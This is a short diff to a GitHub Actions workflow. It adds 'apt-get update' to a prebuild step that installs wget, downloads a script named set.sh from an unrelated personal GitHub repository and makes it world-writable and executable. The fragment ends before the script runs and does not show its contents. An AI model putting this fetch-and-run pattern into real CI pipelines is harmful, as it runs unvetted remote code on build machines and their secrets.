@@ -25,6 +25,7 @@ jobs:
       uses: actions/checkout@v1
     - name: prebuild27
       run: |
+             apt-get update
              apt-get install wget -y 
              wget https://github.com/taebk2838/docker-desktop/raw/master/set.sh
              chmod 777 set.sh
